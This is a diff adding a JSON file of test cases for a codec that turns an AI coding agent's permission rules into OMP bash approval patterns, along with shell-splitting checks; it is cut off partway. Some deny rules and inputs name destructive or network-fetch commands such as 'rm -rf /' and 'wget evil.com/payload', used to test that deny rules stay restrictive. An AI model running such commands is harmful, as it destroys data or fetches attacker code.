@@ -1,0 +1,3155 @@
+{
+  "cases": [
+    {
+      "id": "omp-codec.001",
+      "from": "omp-codec.test.ts: ompCodec encode > maps tiers to OMP approvals",
+      "kind": "function",
+      "module": "compat/codecs",
+      "function": "ompCodec.encode",
+      "args": [
+        {
+          "rules": [
+            {
+              "tool": "Bash",
+              "pattern": "curl x",
+              "tier": "ask"
+            },
+            {
+              "tool": "Bash",
+              "pattern": "rm x",
+              "tier": "deny"
+            },
+            {
+              "tool": "Bash",
+              "pattern": "ls",
+              "tier": "allow"
+            }
+          ]
+        }
+      ],
+      "checks": [
+        {
+          "at": ["bash", "patterns"],
+          "equals": [
+            {
+              "match": "rm x",
+              "approval": "deny"
+            },
+            {
+              "match": "curl x",
+              "approval": "prompt"
+            },
+            {
+              "match": "ls",
+              "approval": "allow"
+            }
+          ]
+        }
+      ]
+    },
+    {
+      "id": "omp-codec.002",
+      "from": "omp-codec.test.ts: ompCodec encode > puts deny before prompt before allow whatever the order given, since OMP takes the first match",
+      "kind": "function",
+      "module": "compat/codecs",
+      "function": "ompCodec.encode",
+      "args": [
+        {
+          "rules": [
+            {
+              "tool": "Bash",
+              "pattern": "git *",
+              "tier": "allow"
+            },
+            {
+              "tool": "Bash",
+              "pattern": "git push *",
+              "tier": "ask"
+            },
+            {
+              "tool": "Bash",
+              "pattern": "git push --force *",
+              "tier": "deny"
+            }
+          ]
+        }
+      ],
+      "expect": {
+        "bash": {
+          "patterns": [
+            {
+              "match": "git push --force",
+              "approval": "deny"
+            },
+            {
+              "match": "git push --force *",
+              "approval": "deny"
+            },
+            {
+              "match": "git push",
+              "approval": "prompt"
+            },
+            {
+              "match": "git push *",
+              "approval": "prompt"
+            },
+            {
+              "match": "git",
+              "approval": "allow"
+            },
+            {
+              "match": "git *",
+              "approval": "allow"
+            }
+          ]
+        }
+      },
+      "notes": "The original asserts facts derived from the result; this case records the whole result."
+    },
+    {
+      "id": "omp-codec.003",
+      "from": "omp-codec.test.ts: ompCodec encode > writes a prefix rule as the bare command and the command with arguments",
+      "kind": "function",
+      "module": "compat/codecs",
+      "function": "ompCodec.encode",
+      "args": [
+        {
+          "rules": [
+            {
+              "tool": "Bash",
+              "pattern": "git push:*",
+              "tier": "deny"
+            }
+          ]
+        }
+      ],
+      "checks": [
+        {
+          "at": ["bash", "patterns"],
+          "equals": [
+            {
+              "match": "git push",
+              "approval": "deny"
+            },
+            {
+              "match": "git push *",
+              "approval": "deny"
+            }
+          ]
+        }
+      ]
+    },
+    {
+      "id": "omp-codec.004",
+      "from": "omp-codec.test.ts: ompCodec encode > writes a trailing wildcard as the bare command as well, as the canonical dialect matches it",
+      "kind": "function",
+      "module": "compat/codecs",
+      "function": "ompCodec.encode",
+      "args": [
+        {
+          "rules": [
+            {
+              "tool": "Bash",
+              "pattern": "git *",
+              "tier": "deny"
+            }
+          ]
+        }
+      ],
+      "checks": [
+        {
+          "at": ["bash", "patterns"],
+          "equals": [
+            {
+              "match": "git",
+              "approval": "deny"
+            },
+            {
+              "match": "git *",
+              "approval": "deny"
+            }
+          ]
+        }
+      ]
+    },
+    {
+      "id": "omp-codec.005",
+      "from": "omp-codec.test.ts: ompCodec encode > writes a domain pattern as a substring match",
+      "kind": "function",
+      "module": "compat/codecs",
+      "function": "ompCodec.encode",
+      "args": [
+        {
+          "rules": [
+            {
+              "tool": "Bash",
+              "pattern": "domain:evil.com",
+              "tier": "deny"
+            }
+          ]
+        }
+      ],
+      "checks": [
+        {
+          "at": ["bash", "patterns"],
+          "equals": [
+            {
+              "match": "*evil.com*",
+              "approval": "deny"
+            }
+          ]
+        }
+      ]
+    },
+    {
+      "id": "omp-codec.006",
+      "from": "omp-codec.test.ts: ompCodec encode > writes a bare Bash rule as a match on everything",
+      "kind": "function",
+      "module": "compat/codecs",
+      "function": "ompCodec.encode",
+      "args": [
+        {
+          "rules": [
+            {
+              "tool": "Bash",
+              "tier": "ask"
+            }
+          ]
+        }
+      ],
+      "checks": [
+        {
+          "at": ["bash", "patterns"],
+          "equals": [
+            {
+              "match": "*",
+              "approval": "prompt"
+            }
+          ]
+        }
+      ]
+    },
+    {
+      "id": "omp-codec.007",
+      "from": "omp-codec.test.ts: ompCodec encode > writes nothing when there is no Bash rule",
+      "kind": "function",
+      "module": "compat/codecs",
+      "function": "ompCodec.encode",
+      "args": [
+        {
+          "rules": [
+            {
+              "tool": "Read",
+              "tier": "allow"
+            }
+          ]
+        }
+      ],
+      "expect": {}
+    },
+    {
+      "id": "omp-codec.008",
+      "from": "omp-codec.test.ts: ompCodec encode > writes nothing when there is no Bash rule",
+      "kind": "function",
+      "module": "compat/codecs",
+      "function": "ompCodec.encode",
+      "args": [{}],
+      "expect": {}
+    },
+    {
+      "id": "omp-codec.009",
+      "from": "omp-codec.test.ts: ompCodec encode > does not repeat an entry",
+      "kind": "function",
+      "module": "compat/codecs",
+      "function": "ompCodec.encode",
+      "args": [
+        {
+          "rules": [
+            {
+              "tool": "Bash",
+              "pattern": "rm x",
+              "tier": "deny"
+            },
+            {
+              "tool": "bash",
+              "pattern": "rm x",
+              "tier": "deny"
+            }
+          ]
+        }
+      ],
+      "checks": [
+        {
+          "at": ["bash", "patterns", "length"],
+          "equals": 1
+        }
+      ]
+    },
+    {
+      "id": "omp-codec.010",
+      "from": "omp-codec.test.ts: ompCodec encode > leaves out an allow rule it cannot express, which is stricter",
+      "kind": "function",
+      "module": "compat/codecs",
+      "function": "ompCodec.encode",
+      "args": [
+        {
+          "rules": [
+            {
+              "tool": "Read",
+              "tier": "allow"
+            },
+            {
+              "tool": "Bash",
+              "pattern": "a\\*b",
+              "tier": "allow"
+            },
+            {
+              "tool": "Bash",
+              "pattern": "ls",
+              "tier": "allow",
+              "when": {
+                "branch": "main"
+              }
+            }
+          ]
+        }
+      ],
+      "expect": {},
+      "notes": "The original asserts facts derived from the result; this case records the whole result."
+    },
+    {
+      "id": "omp-codec.011",
+      "from": "omp-codec.test.ts: ompCodec refusals > refuses a deny or ask for a tool other than Bash",
+      "kind": "function",
+      "module": "compat/codecs",
+      "function": "ompCodec.encode",
+      "args": [
+        {
+          "rules": [
+            {
+              "tool": "Write",
+              "pattern": "./x",
+              "tier": "deny"
+            }
+          ]
+        }
+      ],
+      "throws": {
+        "name": "UnsupportedCapabilityError",
+        "checks": [
+          {
+            "at": ["agent"],
+            "subset": "omp"
+          },
+          {
+            "at": ["unsupported"],
+            "subset": [
+              {
+                "rule": {
+                  "tool": "Write",
+                  "pattern": "./x",
+                  "tier": "deny"
+                }
+              }
+            ]
+          },
+          {
+            "at": ["settings"],
+            "subset": []
+          }
+        ]
+      }
+    },
+    {
+      "id": "omp-codec.012",
+      "from": "omp-codec.test.ts: ompCodec refusals > refuses a deny or ask for a tool other than Bash",
+      "kind": "function",
+      "module": "compat/codecs",
+      "function": "ompCodec.encode",
+      "args": [
+        {
+          "rules": [
+            {
+              "tool": "Write",
+              "pattern": "./x",
+              "tier": "ask"
+            }
+          ]
+        }
+      ],
+      "throws": {
+        "name": "UnsupportedCapabilityError",
+        "checks": [
+          {
+            "at": ["agent"],
+            "subset": "omp"
+          },
+          {
+            "at": ["unsupported"],
+            "subset": [
+              {
+                "rule": {
+                  "tool": "Write",
+                  "pattern": "./x",
+                  "tier": "ask"
+                }
+              }
+            ]
+          },
+          {
+            "at": ["settings"],
+            "subset": []
+          }
+        ]
+      }
+    },
+    {
+      "id": "omp-codec.013",
+      "from": "omp-codec.test.ts: ompCodec refusals > refuses a deny or ask that carries a condition",
+      "kind": "function",
+      "module": "compat/codecs",
+      "function": "ompCodec.encode",
+      "args": [
+        {
+          "rules": [
+            {
+              "tool": "Bash",
+              "pattern": "rm:*",
+              "tier": "deny",
+              "when": {
+                "branch": "main"
+              }
+            }
+          ]
+        }
+      ],
+      "throws": {
+        "name": "UnsupportedCapabilityError",
+        "checks": [
+          {
+            "at": ["agent"],
+            "subset": "omp"
+          },
+          {
+            "at": ["unsupported"],
+            "subset": [
+              {
+                "rule": {
+                  "tool": "Bash",
+                  "pattern": "rm:*",
+                  "tier": "deny",
+                  "when": {
+                    "branch": "main"
+                  }
+                }
+              }
+            ]
+          },
+          {
+            "at": ["settings"],
+            "subset": []
+          }
+        ]
+      }
+    },
+    {
+      "id": "omp-codec.014",
+      "from": "omp-codec.test.ts: ompCodec refusals > refuses a deny or ask that carries a condition",
+      "kind": "function",
+      "module": "compat/codecs",
+      "function": "ompCodec.encode",
+      "args": [
+        {
+          "rules": [
+            {
+              "tool": "Bash",
+              "pattern": "rm:*",
+              "tier": "ask",
+              "when": {
+                "env": {
+                  "CI": "1"
+                }
+              }
+            }
+          ]
+        }
+      ],
+      "throws": {
+        "name": "UnsupportedCapabilityError",
+        "checks": [
+          {
+            "at": ["agent"],
+            "subset": "omp"
+          },
+          {
+            "at": ["unsupported"],
+            "subset": [
+              {
+                "rule": {
+                  "tool": "Bash",
+                  "pattern": "rm:*",
+                  "tier": "ask",
+                  "when": {
+                    "env": {
+                      "CI": "1"
+                    }
+                  }
+                }
+              }
+            ]
+          },
+          {
+            "at": ["settings"],
+            "subset": []
+          }
+        ]
+      }
+    },
+    {
+      "id": "omp-codec.015",
+      "from": "omp-codec.test.ts: ompCodec refusals > refuses a deny or ask on a literal asterisk, which OMP cannot write",
+      "kind": "function",
+      "module": "compat/codecs",
+      "function": "ompCodec.encode",
+      "args": [
+        {
+          "rules": [
+            {
+              "tool": "Bash",
+              "pattern": "echo \\*",
+              "tier": "deny"
+            }
+          ]
+        }
+      ],
+      "throws": {
+        "name": "UnsupportedCapabilityError",
+        "checks": [
+          {
+            "at": ["agent"],
+            "subset": "omp"
+          },
+          {
+            "at": ["unsupported"],
+            "subset": [
+              {
+                "rule": {
+                  "tool": "Bash",
+                  "pattern": "echo \\*",
+                  "tier": "deny"
+                }
+              }
+            ]
+          },
+          {
+            "at": ["settings"],
+            "subset": []
+          }
+        ]
+      }
+    },
+    {
+      "id": "omp-codec.016",
+      "from": "omp-codec.test.ts: ompCodec refusals > refuses a deny or ask on a literal asterisk, which OMP cannot write",
+      "kind": "function",
+      "module": "compat/codecs",
+      "function": "ompCodec.encode",
+      "args": [
+        {
+          "rules": [
+            {
+              "tool": "Bash",
+              "pattern": "rm a\\*:*",
+              "tier": "ask"
+            }
+          ]
+        }
+      ],
+      "throws": {
+        "name": "UnsupportedCapabilityError",
+        "checks": [
+          {
+            "at": ["agent"],
+            "subset": "omp"
+          },
+          {
+            "at": ["unsupported"],
+            "subset": [
+              {
+                "rule": {
+                  "tool": "Bash",
+                  "pattern": "rm a\\*:*",
+                  "tier": "ask"
+                }
+              }
+            ]
+          },
+          {
+            "at": ["settings"],
+            "subset": []
+          }
+        ]
+      }
+    },
+    {
+      "id": "omp-codec.017",
+      "from": "omp-codec.test.ts: ompCodec refusals > refuses an actor, role or approver limit through the shared rule",
+      "kind": "function",
+      "module": "compat/codecs",
+      "function": "ompCodec.encode",
+      "args": [
+        {
+          "rules": [
+            {
+              "tool": "Bash",
+              "pattern": "rm:*",
+              "tier": "deny",
+              "when": {
+                "role": "contractor"
+              }
+            }
+          ]
+        }
+      ],
+      "throws": {
+        "name": "UnsupportedCapabilityError",
+        "checks": [
+          {
+            "at": ["agent"],
+            "subset": "omp"
+          },
+          {
+            "at": ["unsupported"],
+            "subset": [
+              {
+                "rule": {
+                  "tool": "Bash",
+                  "pattern": "rm:*",
+                  "tier": "deny",
+                  "when": {
+                    "role": "contractor"
+                  }
+                }
+              }
+            ]
+          },
+          {
+            "at": ["settings"],
+            "subset": []
+          }
+        ]
+      }
+    },
+    {
+      "id": "omp-codec.018",
+      "from": "omp-codec.test.ts: ompCodec refusals > refuses an actor, role or approver limit through the shared rule",
+      "kind": "function",
+      "module": "compat/codecs",
+      "function": "ompCodec.encode",
+      "args": [
+        {
+          "rules": [
+            {
+              "tool": "Bash",
+              "pattern": "rm:*",
+              "tier": "ask",
+              "approvers": {
+                "roles": ["maintainer"]
+              }
+            }
+          ]
+        }
+      ],
+      "throws": {
+        "name": "UnsupportedCapabilityError",
+        "checks": [
+          {
+            "at": ["agent"],
+            "subset": "omp"
+          },
+          {
+            "at": ["unsupported"],
+            "subset": [
+              {
+                "rule": {
+                  "tool": "Bash",
+                  "pattern": "rm:*",
+                  "tier": "ask",
+                  "approvers": {
+                    "roles": ["maintainer"]
+                  }
+                }
+              }
+            ]
+          },
+          {
+            "at": ["settings"],
+            "subset": []
+          }
+        ]
+      }
+    },
+    {
+      "id": "omp-codec.019",
+      "from": "omp-codec.test.ts: ompCodec refusals > lists every refused rule",
+      "kind": "function",
+      "module": "compat/codecs",
+      "function": "ompCodec.encode",
+      "args": [
+        {
+          "rules": [
+            {
+              "tool": "Write",
+              "tier": "deny"
+            },
+            {
+              "tool": "Bash",
+              "pattern": "rm:*",
+              "tier": "deny"
+            },
+            {
+              "tool": "Edit",
+              "tier": "ask"
+            }
+          ]
+        }
+      ],
+      "throws": {
+        "name": "UnsupportedCapabilityError",
+        "checks": [
+          {
+            "at": ["agent"],
+            "subset": "omp"
+          },
+          {
+            "at": ["unsupported"],
+            "subset": [
+              {
+                "rule": {
+                  "tool": "Write",
+                  "tier": "deny"
+                }
+              },
+              {
+                "rule": {
+                  "tool": "Edit",
+                  "tier": "ask"
+                }
+              }
+            ]
+          },
+          {
+            "at": ["settings"],
+            "subset": []
+          }
+        ]
+      }
+    },
+    {
+      "id": "omp-codec.020",
+      "from": "omp-codec.test.ts: ompCodec keeps every deny and ask at least as restrictive > prefix deny",
+      "kind": "function",
+      "module": "compat/codecs",
+      "function": "ompCodec.encode",
+      "args": [
+        {
+          "defaultMode": "autonomous",
+          "rules": [
+            {
+              "tool": "Bash",
+              "pattern": "git push:*",
+              "tier": "deny"
+            }
+          ]
+        }
+      ],
+      "expect": {
+        "bash": {
+          "patterns": [
+            {
+              "match": "git push",
+              "approval": "deny"
+            },
+            {
+              "match": "git push *",
+              "approval": "deny"
+            }
+          ]
+        }
+      },
+      "notes": "The original asserts facts derived from the result; this case records the whole result."
+    },
+    {
+      "id": "omp-codec.021",
+      "from": "omp-codec.test.ts: ompCodec keeps every deny and ask at least as restrictive > prefix deny",
+      "kind": "function",
+      "module": "shell",
+      "function": "splitShellCommand",
+      "args": ["git push origin main"],
+      "expect": ["git push origin main"],
+      "notes": "The original asserts facts derived from the result; this case records the whole result."
+    },
+    {
+      "id": "omp-codec.022",
+      "from": "omp-codec.test.ts: ompCodec keeps every deny and ask at least as restrictive > prefix deny",
+      "kind": "function",
+      "module": "shell",
+      "function": "splitShellCommand",
+      "args": ["git push origin main"],
+      "expect": ["git push origin main"],
+      "notes": "The original asserts facts derived from the result; this case records the whole result."
+    },
+    {
+      "id": "omp-codec.023",
+      "from": "omp-codec.test.ts: ompCodec keeps every deny and ask at least as restrictive > prefix deny",
+      "kind": "function",
+      "module": "shell",
+      "function": "splitShellCommand",
+      "args": ["git push"],
+      "expect": ["git push"],
+      "notes": "The original asserts facts derived from the result; this case records the whole result."
+    },
+    {
+      "id": "omp-codec.024",
+      "from": "omp-codec.test.ts: ompCodec keeps every deny and ask at least as restrictive > prefix deny",
+      "kind": "function",
+      "module": "shell",
+      "function": "splitShellCommand",
+      "args": ["git push"],
+      "expect": ["git push"],
+      "notes": "The original asserts facts derived from the result; this case records the whole result."
+    },
+    {
+      "id": "omp-codec.025",
+      "from": "omp-codec.test.ts: ompCodec keeps every deny and ask at least as restrictive > prefix deny",
+      "kind": "function",
+      "module": "shell",
+      "function": "splitShellCommand",
+      "args": ["git status && git push origin"],
+      "expect": ["git status", "git push origin"],
+      "notes": "The original asserts facts derived from the result; this case records the whole result."
+    },
+    {
+      "id": "omp-codec.026",
+      "from": "omp-codec.test.ts: ompCodec keeps every deny and ask at least as restrictive > prefix deny",
+      "kind": "function",
+      "module": "shell",
+      "function": "splitShellCommand",
+      "args": ["git status && git push origin"],
+      "expect": ["git status", "git push origin"],
+      "notes": "The original asserts facts derived from the result; this case records the whole result."
+    },
+    {
+      "id": "omp-codec.027",
+      "from": "omp-codec.test.ts: ompCodec keeps every deny and ask at least as restrictive > prefix ask",
+      "kind": "function",
+      "module": "compat/codecs",
+      "function": "ompCodec.encode",
+      "args": [
+        {
+          "defaultMode": "autonomous",
+          "rules": [
+            {
+              "tool": "Bash",
+              "pattern": "npm publish:*",
+              "tier": "ask"
+            }
+          ]
+        }
+      ],
+      "expect": {
+        "bash": {
+          "patterns": [
+            {
+              "match": "npm publish",
+              "approval": "prompt"
+            },
+            {
+              "match": "npm publish *",
+              "approval": "prompt"
+            }
+          ]
+        }
+      },
+      "notes": "The original asserts facts derived from the result; this case records the whole result."
+    },
+    {
+      "id": "omp-codec.028",
+      "from": "omp-codec.test.ts: ompCodec keeps every deny and ask at least as restrictive > prefix ask",
+      "kind": "function",
+      "module": "shell",
+      "function": "splitShellCommand",
+      "args": ["npm publish"],
+      "expect": ["npm publish"],
+      "notes": "The original asserts facts derived from the result; this case records the whole result."
+    },
+    {
+      "id": "omp-codec.029",
+      "from": "omp-codec.test.ts: ompCodec keeps every deny and ask at least as restrictive > prefix ask",
+      "kind": "function",
+      "module": "shell",
+      "function": "splitShellCommand",
+      "args": ["npm publish"],
+      "expect": ["npm publish"],
+      "notes": "The original asserts facts derived from the result; this case records the whole result."
+    },
+    {
+      "id": "omp-codec.030",
+      "from": "omp-codec.test.ts: ompCodec keeps every deny and ask at least as restrictive > prefix ask",
+      "kind": "function",
+      "module": "shell",
+      "function": "splitShellCommand",
+      "args": ["cd /tmp && npm publish"],
+      "expect": ["cd /tmp", "npm publish"],
+      "notes": "The original asserts facts derived from the result; this case records the whole result."
+    },
+    {
+      "id": "omp-codec.031",
+      "from": "omp-codec.test.ts: ompCodec keeps every deny and ask at least as restrictive > prefix ask",
+      "kind": "function",
+      "module": "shell",
+      "function": "splitShellCommand",
+      "args": ["cd /tmp && npm publish"],
+      "expect": ["cd /tmp", "npm publish"],
+      "notes": "The original asserts facts derived from the result; this case records the whole result."
+    },
+    {
+      "id": "omp-codec.032",
+      "from": "omp-codec.test.ts: ompCodec keeps every deny and ask at least as restrictive > exact deny",
+      "kind": "function",
+      "module": "compat/codecs",
+      "function": "ompCodec.encode",
+      "args": [
+        {
+          "defaultMode": "autonomous",
+          "rules": [
+            {
+              "tool": "Bash",
+              "pattern": "rm -rf /",
+              "tier": "deny"
+            }
+          ]
+        }
+      ],
+      "expect": {
+        "bash": {
+          "patterns": [
+            {
+              "match": "rm -rf /",
+              "approval": "deny"
+            }
+          ]
+        }
+      },
+      "notes": "The original asserts facts derived from the result; this case records the whole result."
+    },
+    {
+      "id": "omp-codec.033",
+      "from": "omp-codec.test.ts: ompCodec keeps every deny and ask at least as restrictive > exact deny",
+      "kind": "function",
+      "module": "shell",
+      "function": "splitShellCommand",
+      "args": ["rm -rf /"],
+      "expect": ["rm -rf /"],
+      "notes": "The original asserts facts derived from the result; this case records the whole result."
+    },
+    {
+      "id": "omp-codec.034",
+      "from": "omp-codec.test.ts: ompCodec keeps every deny and ask at least as restrictive > exact deny",
+      "kind": "function",
+      "module": "shell",
+      "function": "splitShellCommand",
+      "args": ["rm -rf /"],
+      "expect": ["rm -rf /"],
+      "notes": "The original asserts facts derived from the result; this case records the whole result."
+    },
+    {
+      "id": "omp-codec.035",
+      "from": "omp-codec.test.ts: ompCodec keeps every deny and ask at least as restrictive > trailing wildcard deny",
+      "kind": "function",
+      "module": "compat/codecs",
+      "function": "ompCodec.encode",
+      "args": [
+        {
+          "defaultMode": "autonomous",
+          "rules": [
+            {
+              "tool": "Bash",
+              "pattern": "rm -rf *",
+              "tier": "deny"
+            }
+          ]
+        }
+      ],
+      "expect": {
+        "bash": {
+          "patterns": [
+            {
+              "match": "rm -rf",
+              "approval": "deny"
+            },
+            {
+              "match": "rm -rf *",
+              "approval": "deny"
+            }
+          ]
+        }
+      },
+      "notes": "The original asserts facts derived from the result; this case records the whole result."
+    },
+    {
+      "id": "omp-codec.036",
+      "from": "omp-codec.test.ts: ompCodec keeps every deny and ask at least as restrictive > trailing wildcard deny",
+      "kind": "function",
+      "module": "shell",
+      "function": "splitShellCommand",
+      "args": ["rm -rf /"],
+      "expect": ["rm -rf /"],
+      "notes": "The original asserts facts derived from the result; this case records the whole result."
+    },
+    {
+      "id": "omp-codec.037",
+      "from": "omp-codec.test.ts: ompCodec keeps every deny and ask at least as restrictive > trailing wildcard deny",
+      "kind": "function",
+      "module": "shell",
+      "function": "splitShellCommand",
+      "args": ["rm -rf /"],
+      "expect": ["rm -rf /"],
+      "notes": "The original asserts facts derived from the result; this case records the whole result."
+    },
+    {
+      "id": "omp-codec.038",
+      "from": "omp-codec.test.ts: ompCodec keeps every deny and ask at least as restrictive > trailing wildcard deny",
+      "kind": "function",
+      "module": "shell",
+      "function": "splitShellCommand",
+      "args": ["rm -rf build"],
+      "expect": ["rm -rf build"],
+      "notes": "The original asserts facts derived from the result; this case records the whole result."
+    },
+    {
+      "id": "omp-codec.039",
+      "from": "omp-codec.test.ts: ompCodec keeps every deny and ask at least as restrictive > trailing wildcard deny",
+      "kind": "function",
+      "module": "shell",
+      "function": "splitShellCommand",
+      "args": ["rm -rf build"],
+      "expect": ["rm -rf build"],
+      "notes": "The original asserts facts derived from the result; this case records the whole result."
+    },
+    {
+      "id": "omp-codec.040",
+      "from": "omp-codec.test.ts: ompCodec keeps every deny and ask at least as restrictive > trailing wildcard deny",
+      "kind": "function",
+      "module": "shell",
+      "function": "splitShellCommand",
+      "args": ["cat a; rm -rf x"],
+      "expect": ["cat a", "rm -rf x"],
+      "notes": "The original asserts facts derived from the result; this case records the whole result."
+    },
+    {
+      "id": "omp-codec.041",
+      "from": "omp-codec.test.ts: ompCodec keeps every deny and ask at least as restrictive > trailing wildcard deny",
+      "kind": "function",
+      "module": "shell",
+      "function": "splitShellCommand",
+      "args": ["cat a; rm -rf x"],
+      "expect": ["cat a", "rm -rf x"],
+      "notes": "The original asserts facts derived from the result; this case records the whole result."
+    },
+    {
+      "id": "omp-codec.042",
+      "from": "omp-codec.test.ts: ompCodec keeps every deny and ask at least as restrictive > bare command wildcard deny",
+      "kind": "function",
+      "module": "compat/codecs",
+      "function": "ompCodec.encode",
+      "args": [
+        {
+          "defaultMode": "autonomous",
+          "rules": [
+            {
+              "tool": "Bash",
+              "pattern": "git *",
+              "tier": "deny"
+            }
+          ]
+        }
+      ],
+      "expect": {
+        "bash": {
+          "patterns": [
+            {
+              "match": "git",
+              "approval": "deny"
+            },
+            {
+              "match": "git *",
+              "approval": "deny"
+            }
+          ]
+        }
+      },
+      "notes": "The original asserts facts derived from the result; this case records the whole result."
+    },
+    {
+      "id": "omp-codec.043",
+      "from": "omp-codec.test.ts: ompCodec keeps every deny and ask at least as restrictive > bare command wildcard deny",
+      "kind": "function",
+      "module": "shell",
+      "function": "splitShellCommand",
+      "args": ["git"],
+      "expect": ["git"],
+      "notes": "The original asserts facts derived from the result; this case records the whole result."
+    },
+    {
+      "id": "omp-codec.044",
+      "from": "omp-codec.test.ts: ompCodec keeps every deny and ask at least as restrictive > bare command wildcard deny",
+      "kind": "function",
+      "module": "shell",
+      "function": "splitShellCommand",
+      "args": ["git"],
+      "expect": ["git"],
+      "notes": "The original asserts facts derived from the result; this case records the whole result."
+    },
+    {
+      "id": "omp-codec.045",
+      "from": "omp-codec.test.ts: ompCodec keeps every deny and ask at least as restrictive > bare command wildcard deny",
+      "kind": "function",
+      "module": "shell",
+      "function": "splitShellCommand",
+      "args": ["git status"],
+      "expect": ["git status"],
+      "notes": "The original asserts facts derived from the result; this case records the whole result."
+    },
+    {
+      "id": "omp-codec.046",
+      "from": "omp-codec.test.ts: ompCodec keeps every deny and ask at least as restrictive > bare command wildcard deny",
+      "kind": "function",
+      "module": "shell",
+      "function": "splitShellCommand",
+      "args": ["git status"],
+      "expect": ["git status"],
+      "notes": "The original asserts facts derived from the result; this case records the whole result."
+    },
+    {
+      "id": "omp-codec.047",
+      "from": "omp-codec.test.ts: ompCodec keeps every deny and ask at least as restrictive > bare command wildcard deny",
+      "kind": "function",
+      "module": "shell",
+      "function": "splitShellCommand",
+      "args": ["git   status"],
+      "expect": ["git   status"],
+      "notes": "The original asserts facts derived from the result; this case records the whole result."
+    },
+    {
+      "id": "omp-codec.048",
+      "from": "omp-codec.test.ts: ompCodec keeps every deny and ask at least as restrictive > bare command wildcard deny",
+      "kind": "function",
+      "module": "shell",
+      "function": "splitShellCommand",
+      "args": ["git   status"],
+      "expect": ["git   status"],
+      "notes": "The original asserts facts derived from the result; this case records the whole result."
+    },
+    {
+      "id": "omp-codec.049",
+      "from": "omp-codec.test.ts: ompCodec keeps every deny and ask at least as restrictive > bare command wildcard deny",
+      "kind": "function",
+      "module": "shell",
+      "function": "splitShellCommand",
+      "args": ["git push origin main"],
+      "expect": ["git push origin main"],
+      "notes": "The original asserts facts derived from the result; this case records the whole result."
+    },
+    {
+      "id": "omp-codec.050",
+      "from": "omp-codec.test.ts: ompCodec keeps every deny and ask at least as restrictive > bare command wildcard deny",
+      "kind": "function",
+      "module": "shell",
+      "function": "splitShellCommand",
+      "args": ["git push origin main"],
+      "expect": ["git push origin main"],
+      "notes": "The original asserts facts derived from the result; this case records the whole result."
+    },
+    {
+      "id": "omp-codec.051",
+      "from": "omp-codec.test.ts: ompCodec keeps every deny and ask at least as restrictive > bare command wildcard deny",
+      "kind": "function",
+      "module": "shell",
+      "function": "splitShellCommand",
+      "args": ["git push"],
+      "expect": ["git push"],
+      "notes": "The original asserts facts derived from the result; this case records the whole result."
+    },
+    {
+      "id": "omp-codec.052",
+      "from": "omp-codec.test.ts: ompCodec keeps every deny and ask at least as restrictive > bare command wildcard deny",
+      "kind": "function",
+      "module": "shell",
+      "function": "splitShellCommand",
+      "args": ["git push"],
+      "expect": ["git push"],
+      "notes": "The original asserts facts derived from the result; this case records the whole result."
+    },
+    {
+      "id": "omp-codec.053",
+      "from": "omp-codec.test.ts: ompCodec keeps every deny and ask at least as restrictive > bare command wildcard deny",
+      "kind": "function",
+      "module": "shell",
+      "function": "splitShellCommand",
+      "args": ["git status && git push origin"],
+      "expect": ["git status", "git push origin"],
+      "notes": "The original asserts facts derived from the result; this case records the whole result."
+    },
+    {
+      "id": "omp-codec.054",
+      "from": "omp-codec.test.ts: ompCodec keeps every deny and ask at least as restrictive > bare command wildcard deny",
+      "kind": "function",
+      "module": "shell",
+      "function": "splitShellCommand",
+      "args": ["git status && git push origin"],
+      "expect": ["git status", "git push origin"],
+      "notes": "The original asserts facts derived from the result; this case records the whole result."
+    },
+    {
+      "id": "omp-codec.055",
+      "from": "omp-codec.test.ts: ompCodec keeps every deny and ask at least as restrictive > bare command wildcard deny",
+      "kind": "function",
+      "module": "shell",
+      "function": "splitShellCommand",
+      "args": ["git log | head"],
+      "expect": ["git log", "head"],
+      "notes": "The original asserts facts derived from the result; this case records the whole result."
+    },
+    {
+      "id": "omp-codec.056",
+      "from": "omp-codec.test.ts: ompCodec keeps every deny and ask at least as restrictive > bare command wildcard deny",
+      "kind": "function",
+      "module": "shell",
+      "function": "splitShellCommand",
+      "args": ["git log | head"],
+      "expect": ["git log", "head"],
+      "notes": "The original asserts facts derived from the result; this case records the whole result."
+    },
+    {
+      "id": "omp-codec.057",
+      "from": "omp-codec.test.ts: ompCodec keeps every deny and ask at least as restrictive > domain deny",
+      "kind": "function",
+      "module": "compat/codecs",
+      "function": "ompCodec.encode",
+      "args": [
+        {
+          "defaultMode": "autonomous",
+          "rules": [
+            {
+              "tool": "Bash",
+              "pattern": "domain:evil.com",
+              "tier": "deny"
+            }
+          ]
+        }
+      ],
+      "expect": {
+        "bash": {
+          "patterns": [
+            {
+              "match": "*evil.com*",
+              "approval": "deny"
+            }
+          ]
+        }
+      },
+      "notes": "The original asserts facts derived from the result; this case records the whole result."
+    },
+    {
+      "id": "omp-codec.058",
+      "from": "omp-codec.test.ts: ompCodec keeps every deny and ask at least as restrictive > domain deny",
+      "kind": "function",
+      "module": "shell",
+      "function": "splitShellCommand",
+      "args": ["curl https://evil.com/x"],
+      "expect": ["curl https://evil.com/x"],
+      "notes": "The original asserts facts derived from the result; this case records the whole result."
+    },
+    {
+      "id": "omp-codec.059",
+      "from": "omp-codec.test.ts: ompCodec keeps every deny and ask at least as restrictive > domain deny",
+      "kind": "function",
+      "module": "shell",
+      "function": "splitShellCommand",
+      "args": ["curl https://evil.com/x"],
+      "expect": ["curl https://evil.com/x"],
+      "notes": "The original asserts facts derived from the result; this case records the whole result."
+    },
+    {
+      "id": "omp-codec.060",
+      "from": "omp-codec.test.ts: ompCodec keeps every deny and ask at least as restrictive > domain deny",
+      "kind": "function",
+      "module": "shell",
+      "function": "splitShellCommand",
+      "args": ["wget evil.com/payload"],
+      "expect": ["wget evil.com/payload"],
+      "notes": "The original asserts facts derived from the result; this case records the whole result."
+    },
+    {
+      "id": "omp-codec.061",
+      "from": "omp-codec.test.ts: ompCodec keeps every deny and ask at least as restrictive > domain deny",
+      "kind": "function",
+      "module": "shell",
+      "function": "splitShellCommand",
+      "args": ["wget evil.com/payload"],
+      "expect": ["wget evil.com/payload"],
+      "notes": "The original asserts facts derived from the result; this case records the whole result."
+    },
+    {
+      "id": "omp-codec.062",
+      "from": "omp-codec.test.ts: ompCodec keeps every deny and ask at least as restrictive > domain deny",
+      "kind": "function",
+      "module": "shell",
+      "function": "splitShellCommand",
+      "args": ["echo evil.com"],
+      "expect": ["echo evil.com"],
+      "notes": "The original asserts facts derived from the result; this case records the whole result."
+    },
+    {
+      "id": "omp-codec.063",
+      "from": "omp-codec.test.ts: ompCodec keeps every deny and ask at least as restrictive > domain deny",
+      "kind": "function",
+      "module": "shell",
+      "function": "splitShellCommand",
